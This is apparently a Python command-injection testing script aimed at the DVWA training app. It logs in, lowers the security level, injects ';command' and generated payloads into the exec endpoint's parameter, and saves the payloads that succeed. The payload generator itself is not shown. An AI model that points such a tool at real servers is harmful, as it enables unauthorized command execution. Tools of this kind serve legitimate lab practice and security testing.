#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import sys
import requests
from requests.exceptions import RequestException

from banner import show_banner
from html_helpers import extract_pre_text
from ping_stripping import strip_ping_lines
from dvwa_helpers import require, norm_join, dvwa_login, dvwa_set_security, parse_extra, post_exec
from payloads import generate_payloads

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"


def run_single_test(args):
    """تشغيل اختبار واحد"""
    try:
        extra = parse_extra(args.data) if args.data else {}
    except ValueError as e:
        print(f"[-] {e}");
        sys.exit(1)
    if "Submit" not in extra:
        extra["Submit"] = "Submit"

    sess = requests.Session()
    base_url = args.url.rstrip('/')
    exec_url = norm_join(base_url, args.exec_path)

    try:
        dvwa_login(sess, base_url, args.username, args.password)
        dvwa_set_security(sess, base_url, args.security_level)
    except Exception as e:
        print(f"{RED}[-] Failed to setup DVWA: {e}{RESET}")
        return False

    # المرجع من ;command
    ref_html = post_exec(sess, exec_url, args.parameter, f";{args.command}", extra)
    ref_pret = extract_pre_text(ref_html).strip()

    if len(ref_pret) == 0:
        print(f"{YELLOW}[!] Empty reference output from ;command{RESET}")
        return False

    reference_output = ref_pret
    payloads = generate_payloads(args.command, base_ip=args.base_ip)

    success = 0
    total = len(payloads)
    successful_payloads = []

    for i, payload in enumerate(payloads, 1):
        try:
            html = post_exec(sess, exec_url, args.parameter, payload, extra)
            pret = extract_pre_text(html).strip()
            pret_no_ping = strip_ping_lines(pret)

            if reference_output in pret_no_ping:
                success += 1
                successful_payloads.append(payload)
                print(f"[{i}/{total}] {GREEN}[+] Success with: {payload}{RESET}")
            else:
                print(f"[{i}/{total}] [-] Failed: {payload}")

        except RequestException as e:
            print(f"[{i}/{total}] {RED}[-] Failed (request error): {payload} - {e}{RESET}")

    print(f"\n[+] Success rate: {success}/{total} ({success / total * 100:.1f}%)")

    # حفظ النتائج الناجحة في ملف
    if successful_payloads:
        with open("successful_payloads.txt", "w") as f:
            for payload in successful_payloads:
                f.write(payload + "\n")
        print(f"{GREEN}[+] Successful payloads saved to successful_payloads.txt{RESET}")

    return success > 0


def run_batch_tests(test_file):
    """تشغيل مجموعة اختبارات من ملف"""
    try:
        with open(test_file, 'r') as f:
            tests = f.readlines()
    except FileNotFoundError:
        print(f"{RED}[-] Test file {test_file} not found{RESET}")
        return False

    successful_tests = 0
    total_tests = 0

    for line_num, line in enumerate(tests, 1):
        line = line.strip()

        # تخطي الأسطر الفارغة والتعليقات
        if not line or line.startswith('#'):
            continue

        total_tests += 1
        print(f"\n{YELLOW}[=== Running Test {total_tests} ===]{RESET}")

        try:
            # تحليل سطر الاختبار
            parts = line.split('|')
            if len(parts) < 5:
                print(f"{RED}[-] Invalid test format on line {line_num}{RESET}")
                continue

            url, username, password, parameter, command = parts[:5]
            data = parts[5] if len(parts) > 5 else None

            # إنشاء كائن args محاكي
            class Args:
                pass

            args = Args()
            args.url = url
            args.username = username
            args.password = password
            args.parameter = parameter
            args.command = command
            args.data = data
            args.exec_path = '/vulnerabilities/exec/'
            args.security_level = 'low'
            args.base_ip = '127.0.0.1'

            if run_single_test(args):
                successful_tests += 1

        except Exception as e:
            print(f"{RED}[-] Error in test {line_num}: {e}{RESET}")

    print(f"\n{YELLOW}[=== Batch Test Results ===]{RESET}")
    print(f"Successful: {successful_tests}/{total_tests}")
    print(f"Success rate: {successful_tests / max(total_tests, 1) * 100:.1f}%")

    return successful_tests == total_tests


def main():
    ap = argparse.ArgumentParser(description="DVWA Command Injection Tester")
    ap.add_argument('-u', '--url', help='DVWA base URL, e.g., http://127.0.0.1/dvwa')
    ap.add_argument('--username', default='admin')
    ap.add_argument('--password', default='password')
    ap.add_argument('--exec-path', default='/vulnerabilities/exec/')
    ap.add_argument('--security-level', default='low')
    ap.add_argument('-p', '--parameter')
    ap.add_argument('-c', '--command')
    ap.add_argument('-d', '--data', help='Extra POST data, e.g., Submit=Submit')
    ap.add_argument('--base-ip', default='127.0.0.1')
    ap.add_argument('--test-file', help='Run tests from file')
    ap.add_argument('--output-file', help='Save results to file')

    args = ap.parse_args()

    show_banner()

    # إعادة توجيه الإخراج إذا طلب المستخدم
    original_stdout = sys.stdout
    if args.output_file:
        sys.stdout = open(args.output_file, 'w')

    try:
        if args.test_file:
            # وضع اختبار الدفعات
            run_batch_tests(args.test_file)
        elif args.url and args.parameter and args.command:
            # وضع الاختبار الفردي
            run_single_test(args)
        else:
            print(f"{RED}[-] Either provide test file or individual test parameters{RESET}")
            ap.print_help()
    finally:
        # استعادة الإخراج الطبيعي
        if args.output_file:
            sys.stdout.close()
            sys.stdout = original_stdout
            print(f"{GREEN}[+] Results saved to {args.output_file}{RESET}")


if __name__ == "__main__":
    main()